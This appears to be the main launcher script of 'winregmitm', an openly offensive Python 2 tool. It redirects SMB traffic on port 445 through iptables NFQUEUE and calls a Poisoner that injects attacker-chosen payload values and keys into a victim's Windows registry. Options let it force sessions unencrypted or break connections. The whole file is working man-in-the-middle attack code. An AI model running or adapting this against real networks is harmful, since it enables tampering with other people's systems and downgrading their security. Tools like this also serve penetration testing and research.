# File from winregmitm project
# Copyright (C) Santiago Hernandez Ramos <shramos@protonmail.com>
# For more information about the project: https://github.com/shramos/winregmitm
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA


import argparse
from poisoner import Poisoner
import banners
import subprocess


def set_iptables_rules():
    subprocess.check_output(
        "iptables -A FORWARD -p tcp --destination-port 445 -j NFQUEUE --queue-num 1",
        shell=True, stderr=subprocess.STDOUT)
    subprocess.check_output(
        "iptables -A FORWARD -p tcp --source-port 445 -j NFQUEUE --queue-num 1",
        shell=True, stderr=subprocess.STDOUT)


def clean_iptables():
    subprocess.check_output(
        "iptables -D FORWARD -p tcp --destination-port 445 -j NFQUEUE --queue-num 1",
        shell=True, stderr=subprocess.STDOUT)
    subprocess.check_output(
        "iptables -D FORWARD -p tcp --source-port 445 -j NFQUEUE --queue-num 1",
        shell=True, stderr=subprocess.STDOUT)


parser = argparse.ArgumentParser()

parser.add_argument("-val", "--value", type=str,
                    help="String payload for insert in the victim's register key")
parser.add_argument("-k", "--key", type=str,
                    help="String register key name for insert the payload")
parser.add_argument("-nk", "--newkey", type=str,
                    help="String key name for insert when the user creates a new key")
parser.add_argument("-v", "--verbosity", action="count",
                    help="increase output verbosity")
parser.add_argument("-nkp", "--newkeypath", type=str,
                    help="Custom path when user is creating a new key")
parser.add_argument("-enc", "--encrypted", action="store_true",
                    help="This argument forces a session to go unencrypted")
parser.add_argument("-bk", "--break-connection", action="store_true",
                    help="This will break the conexion between the client and the server")


args = parser.parse_args()

p = Poisoner()

if(args.value is not None):
    p.value = args.value

if(args.key is not None):
    p.key = args.key

if(args.newkey is not None):
    p.newkey = args.newkey

if args.verbosity is not None and args.verbosity == 1:
    p.verbosity = args.verbosity

if args.newkeypath is not None:
    p.newkeypath = args.newkeypath

if args.encrypted:
    p.encrypted = True

if args.break_connection:
    p.breakcon = True

print banners.get_banner()

print "[*] Setting iptables rules..."
set_iptables_rules()

p.poison()

print "[*] Cleaning iptables rules..."
clean_iptables()
